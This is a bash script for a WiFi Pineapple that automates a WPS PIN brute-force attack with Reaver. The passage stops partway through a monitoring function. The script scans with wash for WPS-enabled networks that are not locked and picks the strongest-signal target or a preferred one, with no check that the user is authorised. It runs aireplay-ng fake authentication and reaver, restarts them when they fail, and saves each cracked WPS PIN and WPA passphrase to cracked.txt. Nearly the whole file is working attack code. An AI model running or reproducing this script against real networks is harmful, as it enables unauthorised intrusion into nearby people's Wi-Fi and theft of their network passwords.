#!/bin/bash

version=1.2
#
#Reaver automation script for wifi pineapple
#Created by airman_dopey
#
# TODO:
#	-Add option to bypass skipping of WPS-locked networks
#	-Add flag to erase all Reaver saved sessions on completion

# This quick check kills the previously run script if it is found running

control_c()
{
	echo -e "\n"	
	echo "Interupt signal caught. Exiting script"
	if [[ $Sleep_PID ]]; then
		kill $Sleep_PID >/dev/null 2>&1
	fi
	if [[ $Monitor -eq 1 ]]; then
		airmon-ng stop mon0 >/dev/null 2>&1
	fi
	if [[ $Wash_PID && $(ps -ef | grep -v grep | grep -v xterm | grep -i "wash" | awk '{ print $1 }') == $Wash_PID ]]; then
		kill $Wash_PID >/dev/null 2>&1
	fi
	if [[ $Aireplay_PID && $(ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }') == $Aireplay_PID ]]; then
		kill $Aireplay_PID >/dev/null 2>&1
	fi
	if [[ $Reaver_PID && $(ps -ef | grep -v grep | grep -v xterm | grep -i "reaver" | grep -v "reaver.sh" | awk '{ print $1 }') == $Reaver_PID ]]; then
		kill $Reaver_PID >/dev/null 2>&1
	fi
	echo default-on > $LED
	ifconfig wlan0 up >/dev/null 2>&1
	if [[ -f /tmp/started.txt ]]; then
		rm /tmp/started.txt
	fi
	exit 1
}

#Trap keyboard interrupt (control-c)
trap control_c SIGINT SIGTERM

#VARIABLES
declare -a BSSID ESSID Channel Signal Locked Cracked_BSSID Blacklist_BSSID
LED="/sys/class/leds/alfa:blue:wps/trigger"
Reaver_Output="/tmp/reaver_output.txt"
Aireplay_Output="/tmp/aireplay_output.txt"
Reaver_Output_Debug="/root/reaver_output.txt"
Aireplay_Output_Debug="/root/aireplay_output.txt"
Relaunch_Limit=3
Alert_Time=120
Normal_Time=600
MinSigStr=-81
Alert_Threshold=5
Monitor=0
Debug=0
Force=0
Install=0
Output=0

#Check for flags
while getopts ":dfhiw:e:b:so:" option; do
	case $option in
		d) Debug=1; Alert_Time=30; Normal_Time=120; echo "DEBUG MODE ENABLED";;
		i) Install=1;;
		f) Force=1;;
		w) if [[ ! "$OPTARG" =~ [0-9] || ! $OPTARG -gt 0 ]]; then echo "Invalid time delay. Type \"./reaver.sh -h\" for more help"; exit 1; else TimeDelay=$OPTARG; fi;;
		b) Preffered_BSSID="$OPTARG"; Preffered_BSSID=`echo $Preffered_BSSID | tr '[a-z]' '[A-Z]'` ;;		
		e) Preffered_ESSID="$OPTARG"; Preffered_ESSID=`echo $Preffered_ESSID | tr '[A-Z]' '[a-z]'` ;;
		s) MinSigStr=-100 ;;
		o) if [[ -f $OPTARG ]]; then echo "Error! File '$OPTARG' already exists!"; exit 1; fi; Output_File="$OPTARG"; echo -e "\c" > $Output_File;;
		h) echo -e "\nThis script attempts a WPS attack utilizing Reaver and the wifi pineapple\n\nUsage: ./reaver.sh [-b BSSID] [-d] [-e ESSID] [-f] [-h] [-i]\n\t\t   [-w time] [-o file] [-s]\n\n\t-b BSSID\tWhen scanning for networks this BSSID will be attacked\n\t\t\tregardless of both signal strength and if it was\n\t\t\tcracked before. (Note: When scanning networks if both\n\t\t\tESSID and BSSID are listed the BSSID is used first)\n\n\t-d\t\tDebug mode: Prints extra information to\n\t\t\thelp with debugging\n\n\t-e ESSID\tWhen scanning for networks this ESSID will be attacked\n\t\t\tregardless of both signal strength and if it was\n\t\t\tcracked before. (Note: When scanning networks if both\n\t\t\tESSID and BSSID are listed the BSSID is used first)\n\n\t-f\t\tForce attack of closest network\n\t\t\t(override check of previously cracked networks)\n\n\t-h\t\tThis screen\n\n\t-i\t\tInstalls Reaver (if missing) and offers\n\t\t\tto integrate with WPS button.\n\t\t\tUse \"int\" to install internally or\n\t\t\t\"usb\" to install to usb\n\t\t\t(Requires internet connection)\n\n\t-o file\t\tSends copy of all output to file\n\n\t-s\t\tOverrides the minimum signal strength required\n\n\t-w delay\twait \"N\" seconds before beginning attack"; exit 0;;
		\?) echo -e "Invalid option: -$OPTARG\nUse -h for more options"; exit 1;;
		:) if [[ "$OPTARG" == "i" ]]; then echo "No location specified. Please type \"./reaver.sh -h\" for more help"; exit 1; elif [[ "$OPTARG" == "w" ]]; then echo "Invalid time delay. Type \"./reaver.sh -h\" for more help"; exit 1; elif [[ "$OPTARG" == "e" ]]; then echo "No ESSID specified. Type \"./reaver.sh -h\" for more help"; exit 1; elif [[ "$OPTARG" == "b" ]]; then echo "No BSSID specified. Type \"./reaver.sh -h\" for more help"; exit 1; elif [[ "$OPTARG" == "o" ]]; then echo "Missing filename. Type \"./reaver.sh -h\" for more help"; exit 1; fi;;
	esac
done

#------------------------------------------
# Toggle LED
#------------------------------------------
fnLED_Toggle () {
	option=$1
	
	if [[ "$option" == "off" ]]; then
		echo none > $LED
	elif [[ "$option" == "on" ]]; then
		echo default-on > $LED
	elif [[ "$option" ==  "flash" ]]; then
		count=0
		while [[ $count -ne 1 ]]; do
			echo default-on > $LED
			for i in {1..600}; do
				echo -e "\c"
			done
			echo none > $LED
			for i in {1..600}; do
				echo -e "\c"
			done
		done
	else 
		count=0
		while [[ $count -ne $option ]]; do
			echo default-on > $LED
			for i in {1..600}; do
				echo -e "\c"
			done
			echo none > $LED
			for i in {1..600}; do
				echo -e "\c"
			done
			((count++))
		done
	fi

	unset option count
}

#------------------------------------------------
# Time Delay Function
#------------------------------------------------
fnDelay (){
	light=0
	tempend=$(expr $TimeDelay - 1)
	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: tempend = $tempend"
		if [[ $Output_File ]]; then
			echo "DEBUG: tempend = $tempend" >> $Output_File
		fi
	fi

	for i in `seq 1 $tempend`; do
		if [[ $light -eq 0 ]]; then
			fnLED_Toggle on
			light=1
		else
			fnLED_Toggle off
			light=0
		fi
		if [[ $Debug -eq 1 ]]; then
			echo "DEBUG: count = $i"
			if [[ $Output_File ]]; then
				echo "DEBUG: count = $i" >> $Output_File
			fi
		fi
		sleep 1
	done
	
	fnLED_Toggle off
	sleep 1
	unset tempend i
		
}

#------------------------------------------------
#Starts and stops karma
#------------------------------------------------
karma (){
	if [[ "$1" == "start" ]]; then
		hostapd_cli -p /var/run/hostapd-phy0 karma_enable > /dev/null
	elif [[ "$1" == "stop" ]]; then
		hostapd_cli -p /var/run/hostapd-phy0 karma_disable > /dev/null
	fi
}

#----------------------------------------------------------------------------
# Phase 1 (Prepping Pineapple)
#----------------------------------------------------------------------------
fnPhase1() {
	echo "[+] Entering Phase 1 (Prepping Pineapple for attack)"
	if [[ $Output_File ]]; then
		echo "[+] Entering Phase 1 (Prepping Pineapple for attack)" >> $Output_File
	fi
	fnLED_Toggle 1

	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: Stopping Karma"
		if [[ $Output_File ]]; then
			echo "DEBUG: Stopping Karma" >> $Output_File
		fi
	fi
	karma stop
	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: Karma Stopped"
		if [[ $Output_File ]]; then
			echo "DEBUG: Karma Stopped" >> $Output_File
		fi
	fi

	ifconfig wlan0 down >/dev/null 2>&1

	iwconfig mon0 > /tmp/tmpintcheck.txt 2>&1
	if [[ `cat /tmp/tmpintcheck.txt | grep -i "No such device"` ]]; then
		airmon-ng start wlan0 >/dev/null 2>&1
		Monitor=1
	fi

	rm /tmp/tmpintcheck.txt
	ifconfig mon0 down >/dev/null 2>&1
	ifconfig mon0 up >/dev/null 2>&1
		
}

#----------------------------------------------------------------------------
# Phase 2 (Scanning for closest vulnerable network)
#----------------------------------------------------------------------------
fnPhase2() {
	echo "[+] Entering Phase 2 (Scanning for vulnerable networks)"
	if [[ $Output_File ]]; then
		echo "[+] Entering Phase 2 (Scanning for vulnerable networks)" >> $Output_File
	fi
	fnLED_Toggle 2

	if [[ $Debug -eq 1 ]]; then
		if [[ $Preffered_BSSID ]]; then
			echo "DEBUG: Preferred BSSID = \"$Preffered_BSSID\""
			if [[ $Output_File ]]; then
				echo "DEBUG: Preferred BSSID = \"$Preffered_BSSID\"" >> $Output_File
			fi
		fi
		if [[ $Preffered_ESSID ]]; then
			echo "DEBUG: Preferred ESSID = \"$Preffered_ESSID\""
			if [[ $Output_File ]]; then
				echo "DEBUG: Preferred ESSID = \"$Preffered_ESSID\"" >> $Output_File
			fi
		fi
	fi		

	if [[ -f cracked.txt && $Force -eq 0 ]]; then
		if [[ $Debug -eq 1 ]]; then
			echo "DEBUG: cracked.txt found. Loading previously cracked networks"
			if [[ $Output_File ]]; then
				echo "DEBUG: cracked.txt found. Loading previously cracked networks" >> $Output_File
			fi
		fi
		count=0
		numlines=`cat "cracked.txt" | wc -l`
		i=1	
	
		while [[ $i -le "$numlines" ]]; do
			bssidcheck=`awk -v k=$i 'FNR == k {print $1}' "cracked.txt"`
			if [[ "$bssidcheck" == "BSSID:" ]]; then	
				Cracked_BSSID[$count]=`awk -v k=$i 'FNR == k {print $2}' "cracked.txt"`
						
				((count++))
			fi
		
			((i++))
		done
		
		NumCracked="${#Cracked_BSSID[@]}"
		unset i count numlines

		if [[ $Debug -eq 1 ]]; then
			echo "DEBUG: $NumCracked networks loaded from cracked.txt"
			if [[ $Output_File ]]; then
				echo "DEBUG: $NumCracked networks loaded from cracked.txt" >> $Output_File
			fi
		fi
	elif [[ $Force -eq 1 ]]; then
		echo "   [+] Force mode detected. Bypassing previous networks"
		if [[ $Output_File ]]; then
			echo "   [+] Force mode detected. Bypassing previous networks" >> $Output_File
		fi
	elif [[ $Preffered_ESSID || $Preffered_BSSID ]]; then
		echo "   [+] Preffered network detected. Bypassing previous networks"
		if [[ $Output_File ]]; then
			echo "   [+] Preffered network detected. Bypassing previous networks" >> $Output_File
		fi
	fi

	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: Launching Wash"
		if [[ $Output_File ]]; then
			echo "DEBUG: Launching Wash" >> $Output_File
		fi
	fi

	wash -i mon0 -o /tmp/wash_output.txt >/dev/null 2>&1 &
	sleep 2
	Wash_PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "wash" | awk '{ print $1 }'`

	if ! [[ $Wash_PID ]]; then
		echo "[!] Wash failed to launch!"
		if [[ $Output_File ]]; then
			echo "[!] Wash failed to launch!" >> $Output_File
		fi
		fnLED_Toggle flash
	fi	

	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: Scan started. PID=$Wash_PID. Starting 60 second sleep"
		if [[ $Output_File ]]; then
			echo "DEBUG: Scan started. PID=$Wash_PID. Starting 60 second sleep" >> $Output_File
		fi
	fi
	sleep 60 & Sleep_PID=$!; wait $Sleep_PID; unset Sleep_PID

	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: Sleep completed. Scanning for and killing Wash"
		if [[ $Output_File ]]; then
			echo "DEBUG: Sleep completed. Scanning for and killing Wash" >> $Output_File
		fi
	fi

	if [[ $(ps -ef | grep -v grep | grep -v xterm | grep -i "wash" | awk '{ print $1 }') == $Wash_PID ]]; then
		kill $Wash_PID
	fi

	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: Finished scanning. Parsing data"
		if [[ $Output_File ]]; then
			echo "DEBUG: Finished scanning. Parsing data" >> $Output_File
		fi
	fi

	count=0
	numlines=`cat "/tmp/wash_output.txt" | wc -l`
	i=3
	skipped=0
	choice=0
	Preferred=0
	
	Orig_IFS=$IFS
	IFS=$'\t'	

	while [[ $i -le "$numlines" ]]; do
		found=0
		lockcheck=`awk -v k=$i 'FNR == k {print $5}' "/tmp/wash_output.txt"`
		bssidcheck=`awk -v k=$i 'FNR == k {print $1}' "/tmp/wash_output.txt"`
		sigcheck=`awk -v k=$i 'FNR == k {print $3}' "/tmp/wash_output.txt"`
		tempessid=`awk -v k=$i 'FNR == k {print $6}' "/tmp/wash_output.txt"`
		essidcheck=`echo $tempessid | tr '[A-Z]' '[a-z]'`
		if [[ $Debug -eq 1 ]]; then
			echo "DEBUG: Lockcheck=\"$lockcheck\""
			echo "DEBUG: BSSIDcheck=\"$bssidcheck\""
			echo "DEBUG: ESSIDcheck=\"$essidcheck\""
			echo "DEBUG: SigCheck=\"$sigcheck\""
			if [[ $Output_File ]]; then
				echo "DEBUG: Lockcheck=\"$lockcheck\"" >> $Output_File
				echo "DEBUG: BSSIDcheck=\"$bssidcheck\"" >> $Output_File
				echo "DEBUG: ESSIDcheck=\"$essidcheck\"" >> $Output_File
				echo "DEBUG: SigCheck=\"$sigcheck\"" >> $Output_File
			fi
		fi
		
		if [[ $NumCracked && $NumCracked -gt 0 ]]; then
			j=0
			while [[ $j -lt $NumCracked && $found -eq 0 ]]; do
								
				if [[ "${Cracked_BSSID[$j]}" == "$bssidcheck" && ! (( $Preffered_ESSID && "$Preffered_ESSID" == "$essidcheck" )) && ! (( $Preffered_BSSID && "$Preffered_BSSID" == "$bssidcheck" )) ]]; then
					found=1
					((skipped++))
					if [[ $Debug -eq 1 ]]; then
						echo "DEBUG: BSSID \"$bssidcheck\" found in cracked.txt - skipping"
						if [[ $Output_File ]]; then
							echo "DEBUG: BSSID \"$bssidcheck\" found in cracked.txt - skipping" >> $Output_File
						fi
					fi
				fi
				((j++))
			done
		fi

		if [[ $NumBlacklist && $NumBlacklist -gt 0 ]]; then
			j=0
			while [[ $j -lt $NumBlacklist && $found -eq 0 ]]; do
								
				if [[ "${Blacklist_BSSID[$j]}" == "$bssidcheck" ]]; then
					found=1
					((skipped++))
					if [[ $Debug -eq 1 ]]; then
						echo "DEBUG: BSSID \"$bssidcheck\" found in blacklist.txt - skipping"
						if [[ $Output_File ]]; then
							echo "DEBUG: BSSID \"$bssidcheck\" found in blacklist.txt - skipping" >> $Output_File
						fi
					fi
				fi
				((j++))
			done
		fi
		
		if [[ ! "$lockcheck" == "Yes" && $found -eq 0 && $sigcheck -ge $MinSigStr ]]; then	
			BSSID[$count]=`awk -v k=$i 'FNR == k {print $1}' "/tmp/wash_output.txt"`
			Channel[$count]=`awk -v k=$i 'FNR == k {print $2}' "/tmp/wash_output.txt"`
			Signal[$count]=`awk -v k=$i 'FNR == k {print $3}' "/tmp/wash_output.txt"`
			Locked[$count]=`awk -v k=$i 'FNR == k {print $5}' "/tmp/wash_output.txt"`
			ESSID[$count]=`awk -v k=$i 'FNR == k {print $6}' "/tmp/wash_output.txt"`
			if [[ $Preffered_BSSID && "$Preffered_BSSID" == "$bssidcheck" ]]; then
				Preffered=1
				choice=$count
				echo "   [+] Preffered BSSID \"$Preffered_BSSID\" found"
				if [[ $Output_File ]]; then
					echo "   [+] Preffered BSSID \"$Preffered_BSSID\" found" >> $Output_File
				fi
			elif [[ $Preffered_ESSID && "$Preffered_ESSID" == "$essidcheck" && $Preffered -eq 0 ]]; then
				Preffered=1
				choice=$count
				echo "   [+] Preffered ESSID \"$Preffered_ESSID\" found"
				if [[ $Output_File ]]; then
					echo "   [+] Preffered ESSID \"$Preffered_ESSID\" found" >> $Output_File
				fi
			fi				
		
			((count++))
		else
			((skipped++))
		fi

		unset lockcheck bssidcheck found
	
		((i++))
	done

	unset i count numlines #hehe
	IFS=$Orig_IFS

	Number_APs="${#BSSID[@]}"
	temp1="${#Channel[@]}"
	temp2="${#Signal[@]}"
	temp3="${#Locked[@]}"
	temp4="${#ESSID[@]}"

	if ! [[ $Number_APs -eq $temp1 && $Number_APs -eq $temp2 && $Number_APs -eq $temp3 && $Number_APs -eq $temp4 ]]; then
		echo "[+] Error! Scanning returned unequal number of values"
		if [[ $Output_File ]]; then
			echo "[+] Error! Scanning returned unequal number of values" >> $Output_File
		fi
		fnLED_Toggle flash
	fi

	unset temp1 temp2 temp3 temp4
	
	if [[ $Number_APs -eq 0 ]]; then
		echo "   [!] $Number_APs networks found!"
		if [[ $Output_File ]]; then
			echo "   [!] $Number_APs networks found!" >> $Output_File
		fi
		fnLED_Toggle flash
	else
		echo "   [+] $Number_APs networks found ($skipped skipped)"
		if [[ $Output_File ]]; then
			echo "   [+] $Number_APs networks found ($skipped skipped)" >> $Output_File
		fi
	fi

	count=1
	
	while [[ $count -lt $Number_APs && $Preffered -eq 0 ]]; do 
		if [[ ${Signal[$choice]} -lt ${Signal[$count]} ]]; then
			choice=$count
			if [[ $Debug -eq 1 ]]; then
				echo "DEBUG: Choice updated to $choice. Associated ESSID: \"${ESSID[$choice]}\"  Signal: ${Signal[$choice]}"
				if [[ $Output_File ]]; then
					echo "DEBUG: Choice updated to $choice. Associated ESSID: \"${ESSID[$choice]}\"  Signal: ${Signal[$choice]}" >> $Output_File
				fi
			fi
		fi
		((count++))
	done

	echo "   [+] Preparing to attack ESSID \"${ESSID[$choice]}\""
	if [[ $Output_File ]]; then
		echo "   [+] Preparing to attack ESSID \"${ESSID[$choice]}\"" >> $Output_File
	fi
		
}

#----------------------------------------------------------------------------
# Phase 3 (Launch Reaver attack)
#----------------------------------------------------------------------------
fnPhase3() {
	echo "[+] Entering Phase 3 (Attack phase)"
	if [[ $Output_File ]]; then
		echo "[+] Entering Phase 3 (Attack phase)" >> $Output_File
	fi
	fnLED_Toggle 3
	
	iwconfig mon0 channel ${Channel[$choice]} >/dev/null 2>&1
	rc=$?
	if [ $rc -ne 0 ]; then	
		echo -e "   [!] Failed to set channel!"
		if [[ $Output_File ]]; then
			echo -e "   [!] Failed to set channel!" >> $Output_File
		fi
		fnLED_Toggle flash
	fi
	aireplay-ng mon0 -1 120 -a ${BSSID[$choice]} -e ${ESSID[$choice]} >$Aireplay_Output 2>&1 &
	echo "   [+] Checking for proper association"
	if [[ $Output_File ]]; then
		echo "   [+] Checking for proper association" >> $Output_File
	fi
	sleep 3

	Aireplay_PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }'`
	if ! [[ $Aireplay_PID ]]; then
		echo -e "   [!] Failed To Launch Aireplay-ng!"
		if [[ $Output_File ]]; then
			echo -e "   [!] Failed To Launch Aireplay-ng!" >> $Output_File
		fi
		fnLED_Toggle flash
	fi 

	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: PID of Aireplay: $Aireplay_PID"
		if [[ $Output_File ]]; then
			echo "DEBUG: PID of Aireplay: $Aireplay_PID" >> $Output_File
		fi
	fi

	if [[ $(cat $Aireplay_Output | grep -i "mon0 is on channel") ]]; then
		echo -e "   [!] Failed Association!"
		if [[ $Output_File ]]; then
			echo -e "   [!] Failed Association!" >> $Output_File
		fi
		if [[ $(ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }') == $Aireplay_PID ]]; then
			kill $Aireplay_PID
		fi
		fnLED_Toggle flash
	elif [[ $(cat $Aireplay_Output | grep -i "denied") ]]; then
		echo "   [!] Failed Association!"
		if [[ $Output_File ]]; then
			echo -e "   [!] Failed Association!" >> $Output_File
		fi
		if [[ $(ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }') == $Aireplay_PID ]]; then
			kill $Aireplay_PID
		fi
		fnLED_Toggle flash
	elif [[ $(cat $Aireplay_Output | grep -i "Invalid AP MAC address") ]]; then
		echo -e "   [!] Failed Association!"
		if [[ $Output_File ]]; then
			echo -e "   [!] Failed Association!" >> $Output_File
		fi
		if [[ $(ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }') == $Aireplay_PID ]]; then
			kill $Aireplay_PID
		fi
		fnLED_Toggle flash
	fi
	Aireplay_lines=`cat $Aireplay_Output | wc -l`
	
	ifconfig wlan0 up

	echo "   [+] Launching Reaver attack"
	if [[ $Output_File ]]; then
		echo "   [+] Launching Reaver attack" >> $Output_File
	fi
	
	reaver -i mon0 -A -a -b ${BSSID[$choice]} -c ${Channel[$choice]} -o $Reaver_Output >/dev/null 2>&1 &
	sleep 3
	Reaver_PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "reaver" | grep -v "reaver.sh" | awk '{ print $1 }'`

	if ! [[ $Reaver_PID ]]; then
		echo -e "   [!] Failed To Launch Reaver!"
		if [[ $Output_File ]]; then
			echo -e "   [!] Failed To Launch Reaver!" >> $Output_File
		fi
		fnLED_Toggle flash
	fi 

	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: PID of Reaver: $Reaver_PID"
		if [[ $Output_File ]]; then
			echo "DEBUG: PID of Reaver: $Reaver_PID" >> $Output_File
		fi
	fi

	Reaver_lines=`cat $Reaver_Output | wc -l`
	LastLine=$(tail -n 1 $Reaver_Output | cut -c -18)
	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: Current number of lines in reaver output: $Reaver_lines"
		if [[ $Output_File ]]; then
			echo "DEBUG: Current number of lines in reaver output: $Reaver_lines" >> $Output_File
		fi
	fi

	echo "   [+] Monitoring Aireplay and Reaver"
	if [[ $Output_File ]]; then
		echo "   [+] Monitoring Aireplay and Reaver" >> $Output_File
	fi
	alert=0
	reaver_checks=0
	aireplay_checks=0
	reaver_relaunch=0
	aireplay_relaunch=0
	quit=0
	
	while [[ $Reaver_PID ]]; do
		alert=0
		fnAireplay_Check
		if [[ $alert -eq 0 ]]; then
			fnReaver_Check
		fi

		if [[ $alert -gt 0 ]]; then
			if [[ $Debug -eq 1 ]]; then
				echo "DEBUG: ~Alert detected. Sleeping for $Alert_Time seconds~"
				if [[ $Output_File ]]; then
					echo "DEBUG: ~Alert detected. Sleeping for $Alert_Time seconds~" >> $Output_File
				fi		
			fi
			sleep $Alert_Time & Sleep_PID=$!; wait $Sleep_PID; unset Sleep_PID
		else
			if [[ $Debug -eq 1 ]]; then
				echo "DEBUG: ~Checks finished. Sleeping for $Normal_Time seconds~"	
				if [[ $Output_File ]]; then
					echo "DEBUG: ~Checks finished. Sleeping for $Normal_Time seconds~" >> $Output_File
				fi	
			fi
			sleep $Normal_Time & Sleep_PID=$!; wait $Sleep_PID; unset Sleep_PID
		fi
	done 

	#cleanup portion after attack has ended
	if [[ $(ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }') == $Aireplay_PID ]]; then
		kill $Aireplay_PID
	fi

	if [[ $Monitor -eq 1 ]]; then
		airmon-ng stop mon0 >/dev/null 2>&1
	fi

	if [[ $(cat $Reaver_Output | grep "WPS PIN:") && $(cat $Reaver_Output | grep "WPA PSK:") ]]; then
		echo -e "\n   -Reaver Attack Successful!-\n"
		if [[ $Output_File ]]; then
			echo -e "\n   -Reaver Attack Successful!-\n" >> $Output_File
		fi
		fnLED_Toggle on
		echo "SSID: ${ESSID[$choice]}"
		if [[ $Output_File ]]; then
			echo "SSID: ${ESSID[$choice]}" >> $Output_File
		fi
		cat $Reaver_Output | grep "WPS PIN:" | cut -c 5-
		cat $Reaver_Output | grep "WPA PSK:" | cut -c 5-
		echo -e "(Creds saved in cracked.txt)\n"
		if [[ $Output_File ]]; then
			echo -e "(Creds saved in cracked.txt)\n" >> $Output_File
		fi

		echo "SSID: ${ESSID[$choice]}" >> cracked.txt
		echo "BSSID: ${BSSID[$choice]}" >> cracked.txt
		cat $Reaver_Output | grep "WPS PIN:" | cut -c 5- >> cracked.txt
		cat $Reaver_Output | grep "WPA PSK:" | cut -c 5- >> cracked.txt
		echo -e " " >> cracked.txt

		if [[ $Debug -eq 0 ]]; then
			#rm *.wpc
			rm $Reaver_Output
		fi
	elif [[ $(cat $Reaver_Output | grep -i "Session Saved") ]]; then
		echo -e "\n[!] Reaver attack interupted. Session showing as saved"
		if [[ $Output_File ]]; then
			echo -e "\n[!] Reaver attack interupted. Session showing as saved" >> $Output_File
		fi
		fnLED_Toggle on
		exit 1
	else
		echo -e "\n[!] Reaver Attack Failed!"
		if [[ $Output_File ]]; then
			echo -e "\n[!] Reaver Attack Failed!" >> $Output_File
		fi
		fnLED_Toggle flash
	fi
}

#----------------------------------------------------------------------------
# Checking to see if Aireplay-ng is running properly
#----------------------------------------------------------------------------
fnAireplay_Check() {
	tmppid=`ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }'`
	if [[ $tmppid && $tmppid == $Aireplay_PID ]]; then
		if [[ $Debug -eq 1 ]]; then
			echo "DEBUG: Aireplay running check successful"
			if [[ $Output_File ]]; then
				echo "DEBUG: Aireplay running check successful" >> $Output_File
			fi
		fi
		tmplines=`cat $Aireplay_Output | wc -l`
		if [[ $tmplines -eq $Reaver_lines ]]; then
			if [[ $Debug -eq 1 ]]; then
				echo "DEBUG: No new lines in Aireplay output"
				if [[ $Output_File ]]; then
					echo "DEBUG: No new lines in Aireplay output" >> $Output_File
				fi
			fi
			((alert++))
		else
			Aireplay_lines=$tmplines
			if [[ $Debug -eq 1 ]]; then
				echo "DEBUG: NumLines check successful"
				echo "DEBUG: Current number of lines in aireplay output: $Aireplay_lines"
				if [[ $Output_File ]]; then
					echo "DEBUG: NumLines check successful" >> $Output_File
					echo "DEBUG: Current number of lines in aireplay output: $Aireplay_lines" >> $Output_File
				fi
			fi
			if [[ `tail -n 3 $Aireplay_Output | grep -i "no such bssid available"` ]]; then
				echo "   [!] Aireplay-ng unable to find BSSID. Attempting to restart"
				if [[ $Output_File ]]; then
					echo "   [!] Aireplay-ng unable to find BSSID. Attempting to restart" >> $Output_File
				fi
				((alert++))
				aireplay_checks=$Alert_Threshold
			elif [[ `tail -n 15 $Aireplay_Output | grep -i "attack was unsuccessful"` ]]; then
				echo "   [!] Aireplay-ng unable to connect to BSSID. Attempting to restart"
				if [[ $Output_File ]]; then
					echo "   [!] Aireplay-ng unable to connect to BSSID. Attempting to restart" >> $Output_File
				fi
				((alert++))
				aireplay_checks=$Alert_Threshold
			elif ! [[ `tail -n 15 $Aireplay_Output | grep -i "Authentication successful"` ]]; then
				if [[ $Debug -eq 1 ]]; then
					echo "DEBUG: Log not showing successful authentication"
					if [[ $Output_File ]]; then
						echo "DEBUG: Log not showing successful authentication" >> $Output_File
					fi
				fi
				((alert++))
			elif ! [[ `tail -n 15 $Aireplay_Output | grep -i "Association successful"` ]]; then
				if [[ $Debug -eq 1 ]]; then
					echo "DEBUG: Log not showing successful association"
					if [[ $Output_File ]]; then
						echo "DEBUG: Log not showing successful association" >> $Output_File
					fi
				fi
				((alert++))
			fi
			#Add more aireplay-ng checks here
		fi
	else
		echo "   [!] Aireplay-ng has stopped unexpectedly. Attempting to restart"
		if [[ $Output_File ]]; then
			echo "   [!] Aireplay-ng has stopped unexpectedly. Attempting to restart" >> $Output_File
		fi
		((alert++))
		aireplay_checks=$Alert_Threshold
	fi

	if [[ $Debug -eq 1 ]]; then
		echo "DEBUG: Finished aireplay checks. $alert alerts"
		if [[ $Output_File ]]; then
			echo "DEBUG: Finished aireplay checks. $alert alerts" >> $Output_File
		fi
	fi
				
	if [[ $alert -gt 0 ]]; then
		((aireplay_checks++))
		if [[ $aireplay_checks -ge $Alert_Threshold ]]; then
			((aireplay_relaunch++))
			if [[ $aireplay_relaunch -le $Relaunch_Limit ]]; then
				if [[ $Debug -eq 1 ]]; then
					echo "DEBUG: Alert threshold reached. Restarting Aireplay-ng"
					if [[ $Output_File ]]; then
						echo "DEBUG: Alert threshold reached. Restarting Aireplay-ng" >> $Output_File
					fi
				fi	
				aireplay_checks=0
				if [[ ! $tmppid ]] || [[ $tmppid -eq $Aireplay_PID ]]; then
					if [[ $tmppid ]]; then
						kill $Aireplay_PID
						sleep 2
						unset Aireplay_PID
					fi
					ifconfig wlan0 down
					iwconfig mon0 channel ${Channel[$choice]} >/dev/null 2>&1
					rc=$?
					if [ $rc -ne 0 ]; then	
						echo -e "   [!] Failed to set channel!"
						if [[ $Output_File ]]; then
							echo -e "   [!] Failed to set channel!" >> $Output_File
						fi
						fnLED_Toggle flash
					fi
					aireplay-ng mon0 -1 120 -a ${BSSID[$choice]} -e ${ESSID[$choice]} >$Aireplay_Output 2>&1 &
					sleep 3

					Aireplay_PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }'`
					Aireplay_lines=`cat $Aireplay_Output | wc -l`
					if [[ ! $Aireplay_PID ]]; then
						echo -e "   [!] Failed To Relaunch Aireplay-ng!"
						if [[ $Output_File ]]; then
							echo -e "   [!] Failed To Relaunch Aireplay-ng!" >> $Output_File
						fi
						fnLED_Toggle flash
					fi 

					if [[ $Debug -eq 1 ]]; then
						echo "DEBUG: new PID of Aireplay: $Aireplay_PID"
						if [[ $Output_File ]]; then
							echo "DEBUG: new PID of Aireplay: $Aireplay_PID" >> $Output_File
						fi
					fi

					if [[ $(cat $Aireplay_Output | grep -i "mon0 is on channel") ]]; then
						echo -e "   [!] Failed Association!"
						if [[ $Output_File ]]; then
							echo -e "   [!] Failed Association!" >> $Output_File
						fi
						if [[ $(ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }') == $Aireplay_PID ]]; then
							kill $Aireplay_PID
						fi
						fnLED_Toggle flash
					elif [[ $(cat $Aireplay_Output | grep -i "denied") ]]; then
						echo "   [!] Failed Association!"
						if [[ $Output_File ]]; then
							echo "   [!] Failed Association!"
						fi
						if [[ $(ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }') == $Aireplay_PID ]]; then
							kill $Aireplay_PID
						fi
						fnLED_Toggle flash
					elif [[ $(cat $Aireplay_Output | grep -i "Invalid AP MAC address") ]]; then
						echo -e "   [!] Failed Association!"
						if [[ $Output_File ]]; then
							echo "   [!] Failed Association!"
						fi
						if [[ $(ps -ef | grep -v grep | grep -v xterm | grep -i "aireplay" | awk '{ print $1 }') == $Aireplay_PID ]]; then
							kill $Aireplay_PID
						fi
						fnLED_Toggle flash
					fi
					ifconfig wlan0 up
					echo "   [+] Successfully relaunched Aireplay-ng"
					if [[ $Output_File ]]; then
						echo "   [+] Successfully relaunched Aireplay-ng" >> $Output_File
					fi
				else
					echo "   [!] Aireplay PID has changed"
					if [[ $Output_File ]]; then
						echo "   [!] Aireplay PID has changed" >> $Output_File
					fi
					fnLED_Toggle flash
				fi
			else
